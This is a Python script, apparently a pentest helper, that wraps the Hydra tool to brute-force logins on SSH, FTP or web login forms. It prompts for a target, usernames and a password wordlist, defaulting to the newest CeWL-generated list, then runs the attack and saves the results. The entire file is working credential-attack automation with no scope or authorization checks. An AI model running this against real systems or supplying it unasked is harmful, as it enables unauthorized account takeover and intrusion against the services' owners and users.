import subprocess
import os
import sys
from datetime import datetime

def prompt(msg, default=None):
    response = input(f"{msg} " + (f"[{default}]: " if default else ": "))
    return response.strip() or default
  
def get_latest_wordlist():
    base_dir = os.path.expanduser("~/cewl_wordlists")
    if not os.path.exists(base_dir):
        print("[!] No CEWL wordlists found.")
        sys.exit(1)
    dirs = sorted(os.listdir(base_dir), reverse=True)
    for d in dirs:
        candidate = os.path.join(base_dir, d, "wordlist.txt")
        if os.path.isfile(candidate):
            return candidate
    print("[!] No valid wordlist found.")
    sys.exit(1)
  
# Prompt user
target = prompt("Enter target IP or domain")
service = prompt("Enter service (e.g., ssh, ftp, http-post-form)", "ssh")
use_user_file = prompt("Use a username file? (yes/no)", "no").lower()
if use_user_file == "yes":
    user_file = prompt("Enter path to username file", "users.txt")
    user_arg = ["-L", user_file]
else:
    username = prompt("Enter a single username")
    user_arg = ["-l", username]
wordlist = prompt("Enter password wordlist path", get_latest_wordlist())

# For http-post-form, prompt for form details
if service == "http-post-form":
    path = prompt("Login path (e.g., /login.php)", "/login.php")
    fields = prompt("Form fields (e.g., username=^USER^&password=^PASS^)", "username=^USER^&password=^PASS^")
    fail_text = prompt("Failure string (e.g., Invalid login)", "Invalid")
    hydra_cmd = [
        "hydra", *user_arg, "-P", wordlist, target, service,
        f"{path}:{fields}:{fail_text}"
    ]
else:
    hydra_cmd = ["hydra", *user_arg, "-P", wordlist, target, service]
  
# Output path
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
results_dir = os.path.expanduser("~/hydra_results")
os.makedirs(results_dir, exist_ok=True)
output_file = os.path.join(results_dir, f"hydra_output_{timestamp}.txt")
print("\n[+] Running Hydra:")
print(" ".join(hydra_cmd))

# Run Hydra
try:
    result = subprocess.run(hydra_cmd, capture_output=True, text=True)
    with open(output_file, "w") as f:
        f.write(result.stdout)
    print(f"\n[:heavy_check_mark:] Hydra results saved to {output_file}")
except Exception as e:
    print(f"[!] Hydra failed: {e}")









